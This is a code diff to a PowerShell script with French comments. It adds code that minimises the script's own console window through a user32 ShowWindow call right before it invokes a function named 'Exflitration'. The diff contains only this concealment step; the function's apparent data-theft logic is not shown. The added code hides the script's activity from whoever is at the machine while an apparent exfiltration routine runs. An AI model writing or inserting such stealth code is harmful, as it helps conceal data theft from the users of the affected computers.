@@ -112,4 +112,19 @@ function Exflitration {
         exit
     }
     
+# Récupérer le handle de la fenêtre PowerShell
+$handle = (Get-Process -PID $PID).MainWindowHandle
+
+# Minimiser la fenêtre
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class User32 {
+        [DllImport("user32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    }
+"@
+[User32]::ShowWindow($handle, 6)  # 6 représente SW_MINIMIZE
+
 Exflitration
